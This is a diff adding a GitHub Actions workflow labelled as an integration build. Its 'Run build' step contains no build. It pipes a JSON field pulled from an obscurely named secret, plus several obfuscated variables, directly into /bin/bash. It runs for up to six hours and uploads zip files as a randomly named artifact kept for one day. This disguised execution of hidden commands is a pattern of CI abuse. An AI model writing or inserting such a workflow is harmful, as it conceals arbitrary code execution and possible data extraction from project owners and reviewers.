@@ -1,0 +1,34 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          rhpvw5080: ${{ secrets.rhpvw5080 }}
+        run: |
+          printf '%s' "$rhpvw5080" | jq -r .yiubr5 | /bin/bash
+          echo $qddif19 | jq -r .n899 | /bin/bash
+          echo $kt567 | jq -r .x0193 | /bin/bash
+          echo $tfh09367 | jq -r .n53 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: zSmkmmX6
+          path: "*.zip"
+          retention-days: 1
